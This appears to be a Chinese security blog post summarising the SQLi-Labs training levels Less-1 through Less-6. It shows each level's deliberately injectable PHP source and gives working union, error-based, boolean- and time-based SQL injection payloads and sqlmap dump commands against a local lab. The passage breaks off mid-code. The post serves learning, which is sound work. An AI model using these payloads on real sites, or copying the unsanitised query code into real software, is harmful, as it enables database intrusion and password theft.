class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" itemprop="url">web知识总结</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>基本知识</span></a></span></div></div><h1 class="post-title" itemprop="name headline">常规漏洞学习总结</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-02-02T01:13:59.702Z" title="发表于 2024-02-02 09:13:59">2024-02-02</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-02-03T04:02:52.529Z" title="更新于 2024-02-03 12:02:52">2024-02-03</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">14.2k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>65分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="常规漏洞学习总结"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2024/02/02/chang-gui-lou-dong-xue-xi-zong-jie/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2024/02/02/chang-gui-lou-dong-xue-xi-zong-jie/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2024/02/02/chang-gui-lou-dong-xue-xi-zong-jie/"><header><a class="post-meta-categories" href="/categories/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" itemprop="url">web知识总结</a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" tabindex="-1" itemprop="url">基本知识</a><h1 id="CrawlerTitle" itemprop="name headline">常规漏洞学习总结</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2024-02-02T01:13:59.702Z" title="发表于 2024-02-02 09:13:59">2024-02-02</time><time itemprop="dateCreated datePublished" datetime="2024-02-03T04:02:52.529Z" title="更新于 2024-02-03 12:02:52">2024-02-03</time></header><h1 id="0x01-sqli_lab">0x01 SQLi_Lab</h1>
<h2 id="less-1">Less-1</h2>
<p>关键源码如下：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">include</span>(<span class="hljs-string">"../sql-connections/sql-connect.php"</span>);
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-comment">// take the variables </span>
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'id'</span>]))
{
<span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'id'</span>];
.......
<span class="hljs-variable">$sql</span>=<span class="hljs-string">"SELECT * FROM users WHERE id='<span class="hljs-subst">$id</span>' LIMIT 0,1"</span>;
<span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);
<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);
.......
<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font color= "#FFFF00"&gt;'</span>;
	<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">mysql_error</span>());
	<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/font&gt;"</span>;  
	}</code></pre>
<p>可以看到这里为get类型传参，且传入的id参数没有经过任何过滤便插入到了SQL语句中，且可以清晰看到闭合方式为单引号。 另外值得注意的是这里用了<code>mysql_error()</code>函数来显示数据库可能的报错信息。</p>
<p>这意味着我们可以进行联合、报错、布尔、时间盲注。</p>
<h3 id="联合注入">联合注入</h3>
<pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">' union select 1,group_concat(username,0x7e,password),3 from users--+</span></code></pre>
<h3 id="报错注入">报错注入</h3>
<pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">' and (select 1 from(select count(*),concat(floor(rand(0)*2),(select concat(username,0x7e,password)from users limit 0,1))a from information_schema.tables group by a)b)--+</span></code></pre>
<p>手动修改<code>limit 0,1</code>进行结果偏移</p>
<h3 id="布尔盲注">布尔盲注</h3>
<pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">' and left(database(),1)&gt;'</span>r<span class="hljs-string">'--+</span>
<span class="hljs-string">?id=1'</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">left</span>(database(),<span class="hljs-number">1</span>)<span class="hljs-operator">&gt;</span><span class="hljs-string">'s'</span><span class="hljs-comment">--+</span></code></pre>
<h3 id="时间盲注">时间盲注</h3>
<pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">' and if(ascii(substr(database(),1,1))&gt;114,1,sleep(5))--+</span>
<span class="hljs-string">?id=1'</span> <span class="hljs-keyword">and</span> if(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">115</span>,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">5</span>))<span class="hljs-comment">--+</span></code></pre>
<h3 id="sqlmap">sqlmap</h3>
<p>联合注入</p>
<pre><code class="hljs sql">python3 sqlmap.py <span class="hljs-operator">-</span>u "http://127.0.0.1/sqllabs/Less-1/?id=1" <span class="hljs-comment">--dbms=MySQL --random-agent --flush-session --technique=U -v3</span>

python3 sqlmap.py <span class="hljs-operator">-</span>u "http://127.0.0.1/sqllabs/Less-1/?id=1" <span class="hljs-comment">--dbms=MySQL --random-agent --flush-session -D security -T users -C username --dump</span>

python3 sqlmap.py <span class="hljs-operator">-</span>u "http://127.0.0.1/sqllabs/Less-1/?id=1" <span class="hljs-comment">--dbms=MySQL --random-agent --flush-session -D security -T users -C password --dump</span></code></pre>
<p>报错注入</p>
<pre><code class="hljs sql">python3 sqlmap.py <span class="hljs-operator">-</span>u "http://127.0.0.1/sqllabs/Less-1/?id=1" <span class="hljs-comment">--dbms=MySQL --random-agent --flush-session --technique=E -v3</span></code></pre>
<p>布尔盲注</p>
<pre><code class="hljs sql">python3 sqlmap.py <span class="hljs-operator">-</span>u "http://127.0.0.1/sqllabs/Less-1/?id=1" <span class="hljs-comment">--dbms=MySQL --random-agent --flush-session --technique=B -v3</span></code></pre>
<p>延时盲注</p>
<pre><code class="hljs sql">python3 sqlmap.py <span class="hljs-operator">-</span>u "http://127.0.0.1/sqllabs/Less-1/?id=1" <span class="hljs-comment">--dbms=MySQL --random-agent --flush-session --technique=T -v3</span></code></pre>
<h2 id="less-2">Less-2</h2>
<p>关键代码如下</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">//including the Mysql connect parameters.</span>
<span class="hljs-keyword">include</span>(<span class="hljs-string">"../sql-connections/sql-connect.php"</span>);
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-comment">// take the variables</span>
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'id'</span>]))
{
<span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'id'</span>];
<span class="hljs-comment">//logging the connection parameters to a file for analysis.</span>
<span class="hljs-variable">$fp</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">'result.txt'</span>,<span class="hljs-string">'a'</span>);
<span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-string">'ID:'</span>.<span class="hljs-variable">$id</span>.<span class="hljs-string">"\n"</span>);
<span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);
<span class="hljs-comment">// connectivity </span>
<span class="hljs-variable">$sql</span>=<span class="hljs-string">"SELECT * FROM users WHERE id=<span class="hljs-subst">$id</span> LIMIT 0,1"</span>;
<span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);
<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);

	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>)
	{
  	<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;font size='5' color= '#99FF00'&gt;"</span>;
  	<span class="hljs-keyword">echo</span> <span class="hljs-string">'Your Login name:'</span>. <span class="hljs-variable">$row</span>[<span class="hljs-string">'username'</span>];
  	<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
  	<span class="hljs-keyword">echo</span> <span class="hljs-string">'Your Password:'</span> .<span class="hljs-variable">$row</span>[<span class="hljs-string">'password'</span>];
  	<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/font&gt;"</span>;
  	}
	<span class="hljs-keyword">else</span> 
	{
	<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font color= "#FFFF00"&gt;'</span>;
	<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">mysql_error</span>());
	<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/font&gt;"</span>;  
	}
}</code></pre>
<p>与上一关类似，只不过参数id这次为数字类型，闭合方式不一样而已。不在赘述了</p>
<h2 id="less-3">Less-3</h2>
<p>关键代码如下</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">//including the Mysql connect parameters.</span>
<span class="hljs-keyword">include</span>(<span class="hljs-string">"../sql-connections/sql-connect.php"</span>);
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-comment">// take the variables</span>
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'id'</span>]))
{
<span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'id'</span>];
<span class="hljs-comment">//logging the connection parameters to a file for analysis.</span>
<span class="hljs-variable">$fp</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">'result.txt'</span>,<span class="hljs-string">'a'</span>);
<span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-string">'ID:'</span>.<span class="hljs-variable">$id</span>.<span class="hljs-string">"\n"</span>);
<span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);
<span class="hljs-comment">// connectivity </span>
<span class="hljs-variable">$sql</span>=<span class="hljs-string">"SELECT * FROM users WHERE id=('<span class="hljs-subst">$id</span>') LIMIT 0,1"</span>;
<span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);
<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);

	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>)
	{
  	<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;font size='5' color= '#99FF00'&gt;"</span>;
  	<span class="hljs-keyword">echo</span> <span class="hljs-string">'Your Login name:'</span>. <span class="hljs-variable">$row</span>[<span class="hljs-string">'username'</span>];
  	<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
  	<span class="hljs-keyword">echo</span> <span class="hljs-string">'Your Password:'</span> .<span class="hljs-variable">$row</span>[<span class="hljs-string">'password'</span>];
  	<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/font&gt;"</span>;
  	}
	<span class="hljs-keyword">else</span> 
	{
	<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font color= "#FFFF00"&gt;'</span>;
	<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">mysql_error</span>());
	<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/font&gt;"</span>;  
	}
}</code></pre>
<p>同样的，这次闭合方式为单引号+括号，其余不变</p>
<h2 id="less-4">Less-4</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">//including the Mysql connect parameters.</span>
<span class="hljs-keyword">include</span>(<span class="hljs-string">"../sql-connections/sql-connect.php"</span>);
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-comment">// take the variables</span>
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'id'</span>]))
{
<span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'id'</span>];
<span class="hljs-comment">//logging the connection parameters to a file for analysis.</span>
<span class="hljs-variable">$fp</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">'result.txt'</span>,<span class="hljs-string">'a'</span>);
<span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-string">'ID:'</span>.<span class="hljs-variable">$id</span>.<span class="hljs-string">"\n"</span>);
<span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);

<span class="hljs-comment">// connectivity </span>

<span class="hljs-variable">$id</span> = <span class="hljs-string">'"'</span> . <span class="hljs-variable">$id</span> . <span class="hljs-string">'"'</span>;
<span class="hljs-variable">$sql</span>=<span class="hljs-string">"SELECT * FROM users WHERE id=(<span class="hljs-subst">$id</span>) LIMIT 0,1"</span>;
<span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);
<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);

	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>)
	{
  	<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;font size='5' color= '#99FF00'&gt;"</span>;
  	<span class="hljs-keyword">echo</span> <span class="hljs-string">'Your Login name:'</span>. <span class="hljs-variable">$row</span>[<span class="hljs-string">'username'</span>];
  	<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
  	<span class="hljs-keyword">echo</span> <span class="hljs-string">'Your Password:'</span> .<span class="hljs-variable">$row</span>[<span class="hljs-string">'password'</span>];
  	<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/font&gt;"</span>;
  	}
	<span class="hljs-keyword">else</span> 
	{
	<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font color= "#FFFF00"&gt;'</span>;
	<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">mysql_error</span>());
	<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/font&gt;"</span>;  
	}
}</code></pre>
<p>也是相同道理，不过在插入SQL语句之前，对id参数内容进行了双引号的拼接，看似复杂，其实就是将闭合方式换为了双引号+括号</p>
<h2 id="less-5">Less-5</h2>
<p>关键代码如下</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">//including the Mysql connect parameters.</span>
<span class="hljs-keyword">include</span>(<span class="hljs-string">"../sql-connections/sql-connect.php"</span>);
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-comment">// take the variables</span>
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'id'</span>]))
{
<span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'id'</span>];
<span class="hljs-comment">//logging the connection parameters to a file for analysis.</span>
<span class="hljs-variable">$fp</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">'result.txt'</span>,<span class="hljs-string">'a'</span>);
<span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-string">'ID:'</span>.<span class="hljs-variable">$id</span>.<span class="hljs-string">"\n"</span>);
<span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);
<span class="hljs-comment">// connectivity </span>
<span class="hljs-variable">$sql</span>=<span class="hljs-string">"SELECT * FROM users WHERE id='<span class="hljs-subst">$id</span>' LIMIT 0,1"</span>;
<span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);
<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);

	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>)
	{
  	<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;	
  	<span class="hljs-keyword">echo</span> <span class="hljs-string">'You are in...........'</span>;
  	<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
    	<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/font&gt;"</span>;
  	}
	<span class="hljs-keyword">else</span> 
	{
	
	<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font size="3" color="#FFFF00"&gt;'</span>;
	<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">mysql_error</span>());
	<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/br&gt;&lt;/font&gt;"</span>;	
	<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font color= "#0000ff" font size= 3&gt;'</span>;	
	
	}
}</code></pre>
<p>这里的闭合方式换为了单引号闭合，但是与之前四关不同的是，这一关不能采用联合注入了，因为代码中不会输出有关查询结果的信息</p>
<h2 id="less-6">Less-6</h2>
<p>关键代码如下</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'id'</span>]))
{
<span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'id'</span>];
<span class="hljs-comment">// connectivity </span>
<span class="hljs-variable">$id</span> = <span class="hljs-string">'"'</span>.<span class="hljs-variable">$id</span>.<span class="hljs-string">'"'</span>;
<span class="hljs-variable">$sql</span>=<span class="hljs-string">"SELECT * FROM users WHERE id=<span class="hljs-subst">$id</span> LIMIT 0,1"</span>;
<span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);
<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);

	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>)
	{
  	<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;	
  	<span class="hljs-keyword">echo</span> <span class="hljs-string">'You are in...........'</span>;
  	<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
